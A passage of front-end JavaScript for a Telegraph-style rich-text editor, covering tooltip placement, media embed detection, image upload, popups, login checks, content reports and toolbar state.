                        setTimeout(() => {
                            $tooltip.addClass('move_anim');
                        }, 10);
                    }
                    
                    if (!$tooltip.hasClass('shown')) {
                        setTimeout(() => {
                            $tooltip.addClass('shown');
                            this.updatePosition($('#_tl_link_tooltip'), null, this.linkTTOptions);
                        }, 10);
                    }
                } catch (e) {
                    console.error('Error showing format tooltip:', e);
                }
            }
            
            static hideFormatTooltip() {
                const $tooltip = $('#_tl_tooltip');
                $tooltip.removeClass('move_anim shown');
                this.updatePosition($('#_tl_link_tooltip'), null, this.linkTTOptions);
            }
            
            static showBlocksTooltip(range) {
                if (!TelegraphEditorManager.isEditMode()) return;
                
                try {
                    const $blocks = $('#_tl_blocks');
                    $blocks.addClass('shown');
                    this.blocksUpdatePosition(range);
                } catch (e) {
                    console.error('Error showing blocks tooltip:', e);
                }
            }
            
            static hideBlocksTooltip() {
                $('#_tl_blocks').removeClass('shown');
            }
            
            static updatePosition(tooltip, range, options) {
                if (!options) options = this.formatTTOptions;
                if (!range && tooltip._range) range = tooltip._range;
                
                if (!range || !window.quill) return;
                
                try {
                    const quill = window.quill;
                    const bounds = quill.getBounds(range);
                    const editorOffset = $(quill.container).offset();
                    
                    const tooltipSize = {
                        width: tooltip.outerWidth(),
                        height: tooltip.outerHeight()
                    };
                    
                    const windowSize = {
                        width: $(window).width(),
                        height: $(window).height(),
                        scrollTop: $(window).scrollTop()
                    };
                    
                    const minPos = {
                        left: 9,
                        top: windowSize.scrollTop + 9
                    };
                    
                    const maxPos = {
                        left: windowSize.width - tooltipSize.width - 9,
                        top: windowSize.scrollTop + windowSize.height - tooltipSize.height - 9
                    };
                    
                    let left = bounds.left + (bounds.width / 2) - (tooltipSize.width / 2);
                    let absoluteLeft = editorOffset.left + left;
                    
                    if (absoluteLeft < minPos.left) {
                        left = minPos.left - editorOffset.left;
                    } else if (absoluteLeft > maxPos.left) {
                        left = maxPos.left - editorOffset.left;
                    }
                    
                    left += (options.offsetX || 0);
                    
                    let top = 0;
                    let isBottom = false;
                    
                    if (options.position === 'top') {
                        top = bounds.top - tooltipSize.height - options.padding;
                        let absoluteTop = editorOffset.top + top;
                        
                        if (absoluteTop < minPos.top) {
                            top = bounds.bottom + options.padding;
                            isBottom = true;
                        }
                    } else if (options.position === 'bottom') {
                        top = bounds.bottom + options.padding;
                        
                        let overlap = this.isOverElement({left: left, top: top, width: tooltipSize.width, height: tooltipSize.height}, 
                                                        options.depend, options.dependPadding);
                        if (overlap) {
                            top = overlap.bottom + options.dependPadding;
                        }
                        
                        let absoluteTop = editorOffset.top + top;
                        isBottom = true;
                        
                        if (absoluteTop > maxPos.top) {
                            top = bounds.top - tooltipSize.height - options.padding;
                            overlap = this.isOverElement({left: left, top: top, width: tooltipSize.width, height: tooltipSize.height}, 
                                                        options.depend, options.dependPadding);
                            if (overlap) {
                                top = overlap.top - tooltipSize.height - options.dependPadding;
                            }
                            isBottom = false;
                        }
                    } else if (options.position === 'right') {
                        top = bounds.top + (bounds.height / 2) - (tooltipSize.height / 2);
                        left = bounds.right + options.padding;
                        
                        let absoluteTop = editorOffset.top + top;
                        let absoluteLeft = editorOffset.left + left;
                        
                        if (absoluteTop < minPos.top) {
                            top = minPos.top - editorOffset.top;
                        } else if (absoluteTop + tooltipSize.height > maxPos.top) {
                            top = maxPos.top - tooltipSize.height - editorOffset.top;
                        }
                        
                        if (absoluteLeft + tooltipSize.width > maxPos.left) {
                            left = bounds.left - tooltipSize.width - options.padding;
                        }
                    }
                    
                    top += (options.offsetY || 0);
                    
                    left = Math.round(left);
                    top = Math.round(top);
                    
                    tooltip._range = range;
                    
                    if (!options.minDelta || 
                        Math.abs(left - (tooltip._left || 0)) >= options.minDelta || 
                        Math.abs(top - (tooltip._top || 0)) >= options.minDelta) {
                        
                        tooltip._left = left;
                        tooltip._top = top;
                        
                        tooltip.css({
                            left: left + 'px',
                            top: top + 'px'
                        }).toggleClass('bottom', isBottom);
                    }
                } catch (e) {
                    console.error('Error updating tooltip position:', e);
                }
            }
            
            static isOverElement(elementRect, dependentElement, padding) {
                if (!dependentElement || !dependentElement.length || !dependentElement.hasClass('shown')) {
                    return false;
                }
                
                try {
                    elementRect.bottom = elementRect.top + elementRect.height;
                    elementRect.right = elementRect.left + elementRect.width;
                    
                    const dependentRect = {
                        top: dependentElement._top || 0,
                        bottom: (dependentElement._top || 0) + dependentElement.outerHeight(),
                        left: dependentElement._left || 0,
                        right: (dependentElement._left || 0) + dependentElement.outerWidth()
                    };
                    
                    if (elementRect.left - dependentRect.right >= padding ||
                        dependentRect.left - elementRect.right >= padding ||
                        elementRect.top - dependentRect.bottom >= padding ||
                        dependentRect.top - elementRect.bottom >= padding) {
                        return false;
                    }
                    
                    return dependentRect;
                } catch (e) {
                    return false;
                }
            }
            
            static blocksUpdatePosition(range) {
                if (range === undefined && window.quill) {
                    range = window.quill.getSelection();
                }
                
                if (!range || !window.quill) return;
                
                try {
                    const bounds = window.quill.getBounds(range);
                    const $blocks = $('#_tl_blocks');
                    const top = bounds.top + (bounds.height / 2) - ($blocks.outerHeight() / 2);
                    $blocks.css('top', Math.round(top) + 'px');
                } catch (e) {
                    console.error('Error updating blocks position:', e);
                }
            }
            
            static updateAllPositions() {
                if (!window.quill) return;
                
                try {
                    const range = window.quill.getSelection();
                    if (range) {
                        if ($('#_tl_tooltip').hasClass('shown')) {
                            this.updatePosition($('#_tl_tooltip'), range, this.formatTTOptions);
                        }
                        if ($('#_tl_link_tooltip').hasClass('shown')) {
                            this.updatePosition($('#_tl_link_tooltip'), range, this.linkTTOptions);
                        }
                        if ($('#_tl_blocks').hasClass('shown')) {
                            this.blocksUpdatePosition(range);
                        }
                    }
                } catch (e) {
                    console.error('Error updating all tooltip positions:', e);
                }
            }
        }
        
        /**
         * Полный менеджер медиа (изображения, видео, embed)
         */
        class TelegraphMediaManager {
            static getFigureValueByUrl(url, callback) {
                if (!url || typeof url !== 'string') {
                    callback(false);
                    return;
                }
                
                let match;
                
                if ((match = url.match(/^(https?):\/\/(www\.)?youtube\.com\/watch.*v=([a-zA-Z0-9_-]+)/i)) ||
                    (match = url.match(/^(https?):\/\/(www\.)?youtu\.be\/([a-zA-Z0-9_-]+)/i))) {
                    callback({
                        embed: '/embed/youtube?url=' + encodeURIComponent(url),
                        type: 'youtube',
                        id: match[3]
                    });
                    return;
                }
                
                if ((match = url.match(/^(https?):\/\/(www\.)?vimeo\.com\/(\d+)/i))) {
                    callback({
                        embed: '/embed/vimeo?url=' + encodeURIComponent(url),
                        type: 'vimeo',
                        id: match[3]
                    });
                    return;
                }
                
                if ((match = url.match(/^(https?):\/\/(www\.|mobile\.)?twitter\.com\/(.+)\/status\/(\d+)/i)) ||
                    (match = url.match(/^(https?):\/\/(www\.|mobile\.)?x\.com\/(.+)\/status\/(\d+)/i))) {
                    callback({
                        embed: '/embed/twitter?url=' + encodeURIComponent(url),
                        type: 'twitter',
                        id: match[4]
                    });
                    return;
                }
                
                if ((match = url.match(/^(https?):\/\/(www\.)?instagram\.com\/(p|reel|tv)\/([a-zA-Z0-9_-]+)/i))) {
                    callback({
                        embed: '/embed/instagram?url=' + encodeURIComponent(url),
                        type: 'instagram',
                        id: match[4]
                    });
                    return;
                }
                
                if ((match = url.match(/^(https?):\/\/(www\.)?tiktok\.com\/@.+\/video\/(\d+)/i))) {
                    callback({
                        embed: '/embed/tiktok?url=' + encodeURIComponent(url),
                        type: 'tiktok',
                        id: match[3]
                    });
                    return;
                }
                
                if ((match = url.match(/^(https?):\/\/(t\.me|telegram\.me|telegram\.dog)\/([a-zA-Z0-9_]+)\/(\d+)/i))) {
                    callback({
                        embed: '/embed/telegram?url=' + encodeURIComponent(url),
                        type: 'telegram',
                        channel: match[2],
                        id: match[3]
                    });
                    return;
                }
                
                if ((match = url.match(/^data:(image\/gif|image\/jpe?g|image\/png|video\/mp4);base64,(.*)$/i))) {
                    const mimeType = match[1].toLowerCase();
                    if (mimeType.startsWith('video/')) {
                        callback({ 
                            video: url,
                            type: 'video',
                            mimeType: mimeType
                        });
                    } else {
                        callback({ 
                            image: url,
                            type: 'image',
                            mimeType: mimeType
                        });
                    }
                    return;
                }
                
                if (url.match(/^(https?):\/\/\S+$/i)) {
                    const img = new Image();
                    const video = document.createElement('video');
                    video.preload = 'metadata';
                    
                    let loadedCount = 0;
                    let resolved = false;
                    
                    const resolve = (type) => {
                        loadedCount++;
                        if (!resolved) {
                            callbackResult(type);
                            resolved = true;
                        }
                    };
                    
                    const reject = () => {
                        loadedCount++;
                        if (loadedCount >= 2 && !resolved) {
                            callbackResult('none');
                            resolved = true;
                        }
                    };
                    
                    const callbackResult = (type) => {
                        if (type === 'image') {
                            callback({ image: url, type: 'image' });
                        } else if (type === 'video') {
                            callback({ video: url, type: 'video' });
                        } else {
                            callback(false);
                        }
                    };
                    
                    img.onload = () => resolve('image');
                    img.onerror = reject;
                    
                    video.onloadeddata = () => resolve('video');
                    video.onerror = reject;
                    
                    img.src = url;
                    video.src = url;
                    
                    setTimeout(() => {
                        if (!resolved) {
                            callback(false);
                        }
                    }, 5000);
                    
                    return;
                }
                
                callback(false);
            }
            
            static updatePhoto(file, callback) {
                if (!file || !(file instanceof File || file instanceof Blob)) {
                    callback(file);
                    return;
                }
                
                if (file.type === 'image/jpeg' || file.type === 'image/jpg') {
                    if (typeof loadImage === 'function') {
                        loadImage(file, (image) => {
                            if (image.type === 'error') {
                                callback(file);
                            } else if (image.toBlob) {
                                image.toBlob((blob) => {
                                    callback(blob);
                                }, file.type);
                            } else if (image.toDataURL) {
                                const dataUrl = image.toDataURL(file.type);
                                const base64Data = dataUrl.split(',')[1];
                                const data = {
                                    type: file.type,
                                    base64_data: base64Data
                                };
                                callback(this.uploadDataToBlob(data));
                            } else {
                                callback(file);
                            }
                        }, {
                            canvas: true,
                            orientation: true,
                            maxWidth: 4096,
                            maxHeight: 4096
                        });
                    } else {
                        callback(file);
                    }
                } else {
                    callback(file);
                }
            }
            
            static uploadDataToBlob(data) {
                if (!data || !data.base64_data || !data.type) {
                    throw new Error('Invalid upload data');
                }
                
                try {
                    const binary = atob(data.base64_data);
                    const array = new Uint8Array(binary.length);
                    
                    for (let i = 0; i < binary.length; i++) {
                        array[i] = binary.charCodeAt(i);
                    }
                    
                    return new Blob([array], { type: data.type });
                } catch (e) {
                    console.error('Error converting base64 to blob:', e);
                    throw e;
                }
            }
            
            static uploadFile(fileData, progressCallback, successCallback, errorCallback) {
                if (!fileData) {
                    if (errorCallback) errorCallback('No file data provided');
                    return;
                }
                
                const formData = new FormData();
                let blob;
                
                try {
                    if (fileData.base64_data && fileData.type) {
                        blob = this.uploadDataToBlob(fileData);
                    } else if (fileData instanceof Blob) {
                        blob = fileData;
                    } else {
                        if (errorCallback) errorCallback('Invalid file data format');
                        return;
                    }
                    
                    formData.append('file', blob, 'upload.' + blob.type.split('/')[1]);
                    
                    $.ajax({
                        url: '/upload',
                        type: 'POST',
                        data: formData,
                        cache: false,
                        dataType: 'json',
                        processData: false,
                        contentType: false,
                        xhr: function() {
                            const xhr = new XMLHttpRequest();
                            if (xhr.upload && progressCallback) {
                                xhr.upload.addEventListener('progress', function(event) {
                                    if (event.lengthComputable) {
                                        progressCallback(event.loaded, event.total);
                                    }
                                });
                            }
                            return xhr;
                        },
                        beforeSend: function() {
                            if (progressCallback) {
                                progressCallback(0, 1);
                            }
                        },
                        success: function(response) {
                            if (response && response.error) {
                                if (errorCallback) errorCallback(response.error);
                            } else if (response && (response.src || response.url)) {
                                if (successCallback) successCallback(response);
                            } else {
                                if (errorCallback) errorCallback('Invalid server response');
                            }
                        },
                        error: function(xhr, status, error) {
                            if (errorCallback) {
                                errorCallback('Network error: ' + (error || status));
                            }
                        },
                        complete: function() {
                            
                            formData.delete('file');
                        }
                    });
                } catch (e) {
                    if (errorCallback) errorCallback('Upload error: ' + e.message);
                }
            }
            
            static getImageDimensions(url) {
                return new Promise((resolve, reject) => {
                    const img = new Image();
                    img.onload = () => {
                        resolve({
                            width: img.naturalWidth,
                            height: img.naturalHeight,
                            aspectRatio: img.naturalWidth / img.naturalHeight
                        });
                    };
                    img.onerror = reject;
                    img.src = url;
                });
            }
            
            static getVideoDimensions(url) {
                return new Promise((resolve, reject) => {
                    const video = document.createElement('video');
                    video.preload = 'metadata';
                    
                    video.onloadedmetadata = () => {
                        resolve({
                            width: video.videoWidth,
                            height: video.videoHeight,
                            aspectRatio: video.videoWidth / video.videoHeight,
                            duration: video.duration
                        });
                    };
                    
                    video.onerror = reject;
                    video.src = url;
                });
            }
            
            static compressImage(file, options = {}) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    
                    reader.onload = function(e) {
                        const img = new Image();
                        
                        img.onload = function() {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d');
                            
                            let width = img.width;
                            let height = img.height;
                            
                            const maxWidth = options.maxWidth || 1920;
                            const maxHeight = options.maxHeight || 1080;
                            const quality = options.quality || 0.8;
                            
                            if (width > maxWidth) {
                                height = (height * maxWidth) / width;
                                width = maxWidth;
                            }
                            
                            if (height > maxHeight) {
                                width = (width * maxHeight) / height;
                                height = maxHeight;
                            }
                            
                            canvas.width = width;
                            canvas.height = height;
                            
                            if (file.type === 'image/png') {
                                ctx.fillStyle = 'white';
                                ctx.fillRect(0, 0, width, height);
                            }
                            
                            ctx.drawImage(img, 0, 0, width, height);
                            
                            canvas.toBlob(function(blob) {
                                resolve(blob);
                            }, file.type, quality);
                        };
                        
                        img.onerror = reject;
                        img.src = e.target.result;
                    };
                    
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }
            
            static isFileSizeValid(file, maxSizeMB = 5) {
                const maxSizeBytes = maxSizeMB * 1024 * 1024;
                return file.size <= maxSizeBytes;
            }
            
            static getFileExtension(filename) {
                return filename.split('.').pop().toLowerCase();
            }
            
            static isImageFile(filename) {
                const ext = this.getFileExtension(filename);
                return ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].includes(ext);
            }
            
            static isVideoFile(filename) {
                const ext = this.getFileExtension(filename);
                return ['mp4', 'webm', 'ogg', 'mov', 'avi'].includes(ext);
            }
            
            static createThumbnail(file, width = 100, height = 100) {
                return new Promise((resolve, reject) => {
                    if (!(file instanceof File || file instanceof Blob)) {
                        reject(new Error('Invalid file type'));
                        return;
                    }
                    
                    const reader = new FileReader();
                    
                    reader.onload = function(e) {
                        const img = new Image();
                        
                        img.onload = function() {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d');
                            
                            canvas.width = width;
                            canvas.height = height;
                            
                            const scale = Math.max(width / img.width, height / img.height);
                            const x = (width - img.width * scale) / 2;
                            const y = (height - img.height * scale) / 2;
                            
                            ctx.drawImage(img, x, y, img.width * scale, img.height * scale);
                            
                            const thumbnail = canvas.toDataURL('image/jpeg', 0.7);
                            resolve(thumbnail);
                        };
                        
                        img.onerror = reject;
                        img.src = e.target.result;
                    };
                    
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }
        }
        
        /**
         * Полный менеджер попапов и алертов
         */
        class TelegraphPopupManager {
            static showError(message) {
                if (!message) return;
                
                const $error = $('#_error_msg');
                $error.text(message);
                
                clearTimeout($error.data('timeout'));
                
                $error.addClass('shown');
                
                const timeout = setTimeout(() => {
                    $error.removeClass('shown');
                }, 3000);
                
                $error.data('timeout', timeout);
            }
            
            static hideError() {
                const $error = $('#_error_msg');
                clearTimeout($error.data('timeout'));
                $error.removeClass('shown');
            }
            
            static hideAlert() {
                $('.tl_alert').remove();
            }
            
            static showAlert(html, options = {}) {
                options.close_btn = options.close_btn || 'OK';
                options.submit_btn = options.submit_btn || false;
                options.close = options.close || this.hideAlert;
                options.submit = options.submit || options.close;
                options.className = options.className || '';
                
                this.hideAlert();
                
                const $alert = $(`
                    <div class="tl_popup tl_alert ${options.className}">
                        <main class="tl_popup_body tl_alert_message">
                            <section></section>
                            <aside class="tl_popup_buttons"></aside>
                        </main>
                    </div>
                `);
                
                $('section', $alert).html(html);
                const $buttons = $('aside', $alert);
                
                if (options.close_btn) {
                    const $closeBtn = $('<button class="button" type="button"></button>');
                    $closeBtn.html(options.close_btn).click(options.close).appendTo($buttons);
                }
                
                if (options.submit_btn) {
                    const $submitBtn = $('<button class="button submit_button" type="button"></button>');
                    $submitBtn.html(options.submit_btn).click(() => {
                        $alert.addClass('tl_popup_loading');
                        options.submit();
                    }).appendTo($buttons);
                }
                
                $alert.appendTo('body');
                
                $alert.click(function(e) {
                    if (e.target === this) {
                        options.close();
                    }
                });
                
                $(document).on('keydown.alert', function(e) {
                    if (e.key === 'Escape') {
                        options.close();
                        $(document).off('keydown.alert');
                    }
                });
                
                return $alert;
            }
            
            static hidePopup() {
                $('.tl_popup').addClass('tl_popup_hidden');
                $(document).off('keydown.alert');
            }
            
            static showPopup($popup) {
                this.hideAlert();
                $popup.removeClass('tl_popup_hidden');
                
                $(document).on('keydown.popup', function(e) {
                    if (e.key === 'Escape') {
                        TelegraphPopupManager.hidePopup();
                        $(document).off('keydown.popup');
                    }
                });
            }
            
            static toolbarPrompt($tooltip, placeholder, callback) {
                const $input = $('.prompt_input', $tooltip);
                const $close = $('.close', $tooltip);
                
                $input.val('').attr('placeholder', placeholder);
                
                const keydownHandler = function(event) {
                    const key = event.which || event.keyCode;
                    
                    if (key === 27) { // Escape
                        TelegraphPopupManager.toolbarPromptHide($tooltip);
                    } else if (key === 13) { // Enter
                        const value = $input.val().trim();
                        if (value && callback) {
                            callback(value);
                            event.preventDefault();
                        }
                        TelegraphPopupManager.toolbarPromptHide($tooltip);
                    }
                };
                
                const blurHandler = function() {
                    setTimeout(() => {
                        TelegraphPopupManager.toolbarPromptHide($tooltip);
                    }, 100);
                };
                
                const closeHandler = function() {
                    TelegraphPopupManager.toolbarPromptHide($tooltip);
                };
                
                $input.off('keydown').on('keydown', keydownHandler);
                $input.off('blur').on('blur', blurHandler);
                $close.off('click').on('click', closeHandler);
                
                $tooltip.show().addClass('tooltip_prompt');
                setTimeout(() => {
                    $input.focus();
                    $input.select();
                }, 10);
            }
            
            static toolbarPromptHide($tooltip) {
                const $input = $('.prompt_input', $tooltip);
                const $close = $('.close', $tooltip);
                
                $input.off('keydown');
                $input.off('blur');
                $close.off('click');
                
                $tooltip.removeClass('tooltip_prompt');
                
                const quill = window.quill;
                if (quill) {
                    setTimeout(() => {
                        quill.focus();
                    }, 50);
                }
            }
            
            static showLoading(message = 'Loading...') {
                this.hideLoading();
                
                const $loading = $(`
                    <div class="tl_popup tl_loading">
                        <main class="tl_popup_body">
                            <div class="tl_loading_spinner"></div>
                            <div class="tl_loading_text">${message}</div>
                        </main>
                    </div>
                `);
                
                $loading.appendTo('body');
                return $loading;
            }
            
            static hideLoading() {
                $('.tl_loading').remove();
            }
            
            static showConfirmation(message, options = {}) {
                options.title = options.title || 'Confirm';
                options.confirmText = options.confirmText || 'Yes';
                options.cancelText = options.cancelText || 'No';
                options.onConfirm = options.onConfirm || function() {};
                options.onCancel = options.onCancel || function() {};
                
                return this.showAlert(`
                    <h3>${options.title}</h3>
                    <p>${message}</p>
                `, {
                    close_btn: options.cancelText,
                    submit_btn: options.confirmText,
                    close: () => {
                        options.onCancel();
                        this.hideAlert();
                    },
                    submit: () => {
                        options.onConfirm();
                        this.hideAlert();
                    }
                });
            }
            
            static showToast(message, type = 'info', duration = 3000) {
                const $toast = $(`
                    <div class="tl_toast tl_toast_${type}">
                        <div class="tl_toast_content">${message}</div>
                    </div>
                `);
                
                $('body').append($toast);
                
                setTimeout(() => {
                    $toast.addClass('tl_toast_show');
                }, 10);
                
                setTimeout(() => {
                    $toast.removeClass('tl_toast_show');
                    setTimeout(() => {
                        $toast.remove();
                    }, 300);
                }, duration);
                
                return $toast;
            }
        }
        
        /**
         * Полный менеджер аутентификации
         */
        class TelegraphAuthManager {
            static checkAuth() {
                if (!T.editable) {
                    return Promise.resolve(null);
                }
                
                return new Promise((resolve, reject) => {
                    $.ajax({
                        url: T.apiUrl + '/check',
                        data: { page_id: T.pageId },
                        type: 'POST',
                        dataType: 'json',
                        xhrFields: { withCredentials: true },
                        success: function(response) {
                            if (response.save_hash) {
                                T.saveHash = response.save_hash;
                            }
                            
                            if (response.report_hash) {
                                T.reportHash = response.report_hash;
                                $('.tl_page_footer').addClass('tl_page_footer_visible');
                            }
                            
                            const $article = $('.tl_article');
                            if ((response.can_edit && T.saveHash) || !T.pageId) {
                                if (response.short_name) {
                                    $('.account').text(response.short_name);
                                }
                                $article.addClass('tl_article_editable');
                            }
                            
                            if (!T.pageId) {
                                $article.addClass('tl_article_edit');
                                
                                const draftManager = new TelegraphDraftManager();
                                if (!draftManager.get() && response.author_name) {
                                    const authorData = response.author_url ? { link: response.author_url } : {};
                                    const quill = window.quill;
                                    
                                    if (quill) {
                                        const authorBlots = quill.scroll.descendants(
                                            Quill.import('blots/author') || function() {}
                                        );
                                        
                                        if (authorBlots && authorBlots[0]) {
                                            const authorBlot = authorBlots[0];
                                            quill.updateContents(
                                                new Quill.import('delta')({
                                                    ops: [{
                                                        retain: authorBlot.offset()
                                                    }, {
                                                        delete: authorBlot.length()
                                                    }, {
                                                        insert: response.author_name,
                                                        attributes: authorData
                                                    }]
                                                }),
                                                Quill.sources.USER
                                            );
                                        }
                                    }
                                }
                            }
                            
                            if (response.auth_alert && response.short_name) {
                                let alertHtml = `
                                    <i class="tl_alert_success"></i>
                                    <h4>Success!</h4>
                                    <p>You are now logged in as <b>${TelegraphUtils.htmlSpecialChars(response.short_name)}</b> in this browser.</p>
                                `;
                                
                                if (response.migrate_count > 0 && response.migrate_hash) {
                                    alertHtml += `
                                        <p>We can also add ${response.migrate_count} Telegraph page${response.migrate_count > 1 ? 's' : ''} from this browser to your account.</p>
                                    `;
                                    
                                    TelegraphPopupManager.showAlert(alertHtml, {
                                        close_btn: 'Skip',
                                        submit_btn: 'Add',
                                        submit: function() {
                                            TelegraphAuthManager.migratePages(response.migrate_hash);
                                        }
                                    });
                                } else {
                                    TelegraphPopupManager.showAlert(alertHtml, {
                                        close_btn: 'Continue'
                                    });
                                }
                            }
                            
                            const draftManager = new TelegraphDraftManager();
                            draftManager.pageContent = TelegraphContentManager.getPageContent(true);
                            TelegraphEditorManager.updateEditable(TelegraphEditorManager.isEditMode());
                            
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            console.error('Auth check failed:', error);
                            reject(error);
                        }
                    });
                });
            }
            
            static migratePages(migrateHash) {
                return new Promise((resolve, reject) => {
                    $.ajax({
                        url: T.apiUrl + '/migrate',
                        data: { migrate_hash: migrateHash },
                        type: 'POST',
                        dataType: 'json',
                        xhrFields: { withCredentials: true },
                        success: function(response) {
                            if (response.migrated_count > 0) {
                                TelegraphPopupManager.showAlert(`
                                    <i class="tl_alert_success"></i>
                                    <h4>Success!</h4>
                                    <p>Added <b>${response.migrated_count}</b> Telegraph page${response.migrated_count > 1 ? 's' : ''} to your account.</p>
                                    <p>To see a list of your pages, talk to the <a href="https://t.me/telegraph" target="_blank">@Telegraph</a> bot on Telegram.</p>
                                `, {
                                    close_btn: 'Continue'
                                });
                            } else {
                                TelegraphPopupManager.hideAlert();
                            }
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            console.error('Migrate pages failed:', error);
                            reject(error);
                        }
                    });
                });
            }
            
            static login() {
            
                const tg = window.Telegram?.WebApp;
                if (tg) {
                    tg.openTelegramLink('https://t.me/telegraph');
                } else {
                    window.open('https://t.me/telegraph', '_blank');
                }
            }
            
            static logout() {
                return new Promise((resolve, reject) => {
                    $.ajax({
                        url: T.apiUrl + '/logout',
                        type: 'POST',
                        dataType: 'json',
                        xhrFields: { withCredentials: true },
                        success: function(response) {
                            if (response.success) {
                                TelegraphPopupManager.showToast('Logged out successfully', 'success');
                                
                                setTimeout(() => {
                                    window.location.reload();
                                }, 1500);
                            }
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            console.error('Logout failed:', error);
                            reject(error);
                        }
                    });
                });
            }
            
            static isLoggedIn() {
                return T.saveHash !== null;
            }
            
            static getUserInfo() {
                return new Promise((resolve, reject) => {
                    $.ajax({
                        url: T.apiUrl + '/user',
                        type: 'GET',
                        dataType: 'json',
                        xhrFields: { withCredentials: true },
                        success: function(response) {
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            reject(error);
                        }
                    });
                });
            }
            
            static updateUserProfile(profileData) {
                return new Promise((resolve, reject) => {
                    $.ajax({
                        url: T.apiUrl + '/user/update',
                        type: 'POST',
                        data: profileData,
                        dataType: 'json',
                        xhrFields: { withCredentials: true },
                        success: function(response) {
                            if (response.success) {
                                TelegraphPopupManager.showToast('Profile updated', 'success');
                            }
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            console.error('Update profile failed:', error);
                            reject(error);
                        }
                    });
                });
            }
        }
        
        /**
         * Полный менеджер репортов
         */
        class TelegraphReportManager {
            static updateReportFormState() {
                const form = document.getElementById('_report_form');
                if (!form) return;
                
                const isDisabled = !form.reason.value || form.reason.value === 'copyright';
                $(form).toggleClass('copyright_selected', form.reason.value === 'copyright');
                $(form).toggleClass('form_disabled', !!isDisabled);
                
                if (form.reason.value) {
                    setTimeout(() => {
                        form.comment.focus();
                    }, 100);
                }
            }
            
            static sendReport() {
                const $form = $('#_report_form');
                if ($form.hasClass('form_disabled')) {
                    return false;
                }
                
                const form = $form.get(0);
                if (!form.reason.value) {
                    TelegraphPopupManager.showError('Please select a reason');
                    return false;
                }
                
                $('#_report_popup').addClass('tl_popup_loading');
                
                $.ajax({
                    url: T.apiUrl + '/report',
                    data: {
                        page_id: T.pageId,
                        report_hash: T.reportHash,
                        reason: form.reason.value,
                        reason_text: form.comment.value
                    },
                    type: 'POST',
                    dataType: 'json',
                    xhrFields: { withCredentials: true },
                    success: function(response) {
                        $('#_report_popup').removeClass('tl_popup_loading');
                        TelegraphPopupManager.hidePopup();
                        TelegraphPopupManager.showAlert(`
                            <i class="tl_alert_success"></i>
                            <h4>Report sent</h4>
                            <p>Telegraph moderators will review your report. Thank you!</p>
                        `, {
                            close_btn: 'Done'
                        });
                    },
                    error: function(xhr, status, error) {
                        $('#_report_popup').removeClass('tl_popup_loading');
                        TelegraphPopupManager.showError('Failed to send report: ' + error);
                    }
                });
                
                return true;
            }
            
            static showReportDialog() {
                const form = document.getElementById('_report_form');
                if (form) {
                    form.reset();
                    this.updateReportFormState();
                    TelegraphPopupManager.showPopup($('#_report_popup'));
                }
            }
            
            static cancelReport() {
                TelegraphPopupManager.hidePopup();
            }
            
            static validateReport(reason, comment) {
                if (!reason) {
                    return { valid: false, error: 'Please select a reason' };
                }
                
                if (reason === 'other' && (!comment || comment.trim().length < 10)) {
                    return { valid: false, error: 'Please provide more details (at least 10 characters)' };
                }
                
                if (comment && comment.length > 1000) {
                    return { valid: false, error: 'Comment is too long (max 1000 characters)' };
                }
                
                return { valid: true, error: null };
            }
            
            static getReportReasons() {
                return [
                    { value: 'violence', label: 'Violence', description: 'Violent or graphic content' },
                    { value: 'childabuse', label: 'Child Abuse', description: 'Content involving child exploitation' },
                    { value: 'copyright', label: 'Copyright', description: 'Copyright infringement' },
                    { value: 'illegal_drugs', label: 'Illegal Drugs', description: 'Promotion of illegal drugs' },
                    { value: 'personal_details', label: 'Personal Details', description: 'Sharing of personal information' },
                    { value: 'spam', label: 'Spam', description: 'Spam or misleading content' },
                    { value: 'hate_speech', label: 'Hate Speech', description: 'Hate speech or discrimination' },
                    { value: 'other', label: 'Other', description: 'Other reason' }
                ];
            }
        }
        
        /**
         * Полный менеджер тулбара
         */
        class TelegraphToolbarManager {
            static update(range) {
                const quill = window.quill;
                if (!quill) return;
                
                try {
                    const format = range ? quill.getFormat(range) : {};
                    const isAuthor = !!format.blockAuthor;
                    const isHeader = !!(format.blockHeader || format.blockSubheader);
                    const isCodeBlock = !!format['code-block'];
                    const isList = !!format.list;
                    
                    const $bold = $('#_bold_button');
                    const $italic = $('#_italic_button');
                    const $header = $('#_header_button');
                    const $subheader = $('#_subheader_button');
                    const $quote = $('#_quote_button');
                    const $link = $('#_link_button');
                    
                    $bold.toggleClass('active', !!format.bold);
                    $bold.toggleClass('disabled', isAuthor || isHeader || isCodeBlock || isList);
                    
                    $italic.toggleClass('active', !!format.italic);
                    $italic.toggleClass('disabled', isAuthor || isHeader || isCodeBlock || isList);
                    
                    $header.toggleClass('active', !!format.blockHeader);
                    $header.toggleClass('disabled', isAuthor || isList);
                    
                    $subheader.toggleClass('active', !!format.blockSubheader);
                    $subheader.toggleClass('disabled', isAuthor || isList);
                    
                    $quote.toggleClass('active', !!(format.blockBlockquote || format.blockPullquote));
                    $quote.toggleClass('pullquote', !!format.blockPullquote);
                    $quote.toggleClass('disabled', isAuthor || isList);
                    
                    if (range) {
                        const linkBlots = quill.scroll.descendants(
                            Quill.import('blots/link') || function() {},
                            range.index,
                            range.length
                        );
                        $link.toggleClass('active', !!linkBlots.length);
                        $link.toggleClass('disabled', isCodeBlock || isList);
                    } else {
                        $link.toggleClass('active', false);
                    }
                } catch (e) {
                    console.error('Error updating toolbar:', e);
                }
            }
            
            static handleFormatButton(buttonId, formatName, value = true) {
                const quill = window.quill;
                if (!quill) return;
                
                try {
                    const range = quill.getSelection();
                    if (!range) return;
                    
                    const currentFormat = quill.getFormat(range);
                    const isActive = currentFormat[formatName];
                    
                    if (formatName === 'link') {
                        if (isActive) {
                            
                            const linkBlots = quill.scroll.descendants(
                                Quill.import('blots/link') || function() {},
                                range.index,
                                range.length
                            );
                            
                            linkBlots.forEach(function(link) {
                                quill.formatText(link.offset(quill.scroll), link.length(), 'link', false);
                            });
                        } else {
                            
